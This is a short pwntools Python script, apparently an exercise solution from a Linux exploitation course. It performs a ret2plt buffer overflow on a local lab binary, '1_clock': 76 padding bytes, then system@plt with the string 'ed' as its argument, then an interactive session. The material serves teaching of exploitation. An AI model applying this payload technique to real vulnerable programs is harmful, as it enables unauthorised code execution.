#!/usr/bin/python
# https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/9_bypass_ret2plt/lessonplan.md

from pwn import *

# Ret to lpt worki
# First, look at plt stubs availables with: objdump -d ./1_clock -j .plt
# ...
# 08048370 <system@plt>:
# 8048370:	ff 25 18 a0 04 08    	jmp    *0x804a018
# 8048376:	68 18 00 00 00       	push   $0x18
# 804837b:	e9 b0 ff ff ff       	jmp    8048330 <.plt>
#
# Can use this address of system to return and execute a command, but cant find /bin/sh in the binary
# So, use another string for another command, like 'ed'
# gdb-peda$ find "ed"
# Searching for 'ed' in: None ranges
# Found 411 results, display max 256 items:
# 1_clock : 0x8048263 --> 0x70006465 ('ed')


def write_to_file(value):
    f = open('xpl', 'w')
    f.write(value)
    f.close

def create_exploit():
    system_plt = 0x08048370
    ed_str = 0x8048263

    overflow = "A"*76 
    ret = p32(system_plt)
    argument_to_system = p32(ed_str)

    payload = overflow + ret + 'BBBB' + argument_to_system
    return payload

def main():
    # Start the process
    p = process("../build/1_clock")

    # Print the pid
    raw_input(str(p.proc.pid))

    payload = create_exploit()

    # Send the payload
    p.send(payload)

    # Pass interaction to the user
    p.interactive()

#if __name__ == "__main__":
main()
#write_to_file(create_exploit())
